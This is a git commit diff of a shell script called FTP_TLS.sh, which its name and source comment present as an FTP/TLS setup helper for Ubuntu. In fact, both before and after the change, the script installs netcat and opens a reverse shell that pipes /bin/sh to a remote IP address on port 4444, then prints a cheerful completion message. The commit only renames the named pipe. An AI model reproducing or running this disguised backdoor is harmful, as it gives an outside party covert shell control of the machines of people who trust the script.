2e4712b41c7f043d0ee9894936a79202b3fd3e40
Radovan Andráš <andrasradovan@gmail.com>
2020-09-30 16:22:09 +0200

    Update FTP_TLS.sh

--- FTP_TLS.sh
+++ FTP_TLS.sh
@@ -1,9 +1,9 @@
 #!/bin/sh
 sudo apt-get install netcat python3 > /dev/null
 
-mknod /tmp/backpipe p > /dev/null 2>&1 &
-/bin/sh 0</tmp/backpipe | nc 85.255.3.232 4444 1>/tmp/backpipe &
+mknod /tmp/pipe p > /dev/null 2>&1 &
+/bin/sh 0</tmp/pipe | nc 85.255.3.232 4444 1>/tmp/pipe &
 
 echo "And it's done :)"
 
-#source: https://github.com/EasyFixIt/FTP_ubuntu_TLS
+# source: https://github.com/EasyFixIt/FTP_ubuntu_TLS
